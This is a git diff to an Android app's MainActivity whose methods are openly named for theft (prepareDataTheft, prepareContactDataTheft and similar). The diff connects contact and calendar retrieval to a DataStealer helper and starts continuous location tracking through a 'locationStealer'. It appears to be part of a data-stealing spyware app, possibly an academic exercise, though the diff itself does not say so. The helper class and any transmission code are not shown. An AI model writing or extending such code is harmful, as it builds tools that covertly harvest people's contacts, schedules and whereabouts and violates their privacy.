@@ -5,6 +5,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Parcelable;
+import android.util.Log;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
@@ -66,7 +67,13 @@ public class MainActivity extends AppCompatActivity implements IApp {
      * Mostly taken from https://developer.android.com/training/permissions/requesting#java
      */
     public void prepareDataTheft() {
-        prepareContactDataTheft();
+        try {
+            getContacts();
+        } catch (NoPermissionsException e) {
+            Log.d("ERROE", "EXCEPTION THROWN");
+        }
+
+        //prepareContactDataTheft();
         prepareCalendarDataTheft();
         prepareCoarsePositionTheft();
     }
@@ -87,6 +94,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
 
 
     private void prepareContactDataTheft() {
+        // Code left standing to use for request of permissions
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CONTACTS)
                 != PackageManager.PERMISSION_GRANTED) {
@@ -207,16 +215,29 @@ public class MainActivity extends AppCompatActivity implements IApp {
 
     @Override
     public List<CalendarEvent> getCalendarEvents() throws NoPermissionsException {
-        return null;
+        try {
+            return DataStealer.takeCalendarData(getApplicationContext());
+        } catch (SecurityException e) {
+            throw new NoPermissionsException();
+        }
     }
 
     @Override
     public List<Contact> getContacts() throws NoPermissionsException {
-        return null;
+        try {
+            return DataStealer.takeContactData(getApplicationContext());
+        } catch (SecurityException e) {
+            throw new NoPermissionsException();
+        }
+
     }
 
     @Override
     public List<LocationData> getLocation() throws NoPermissionsException {
+        FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
+        DataStealer locationStealer = new DataStealer(client);
+        locationStealer.getContinuousLocationUpdates(getApplicationContext());
+        
         return null;
     }
 
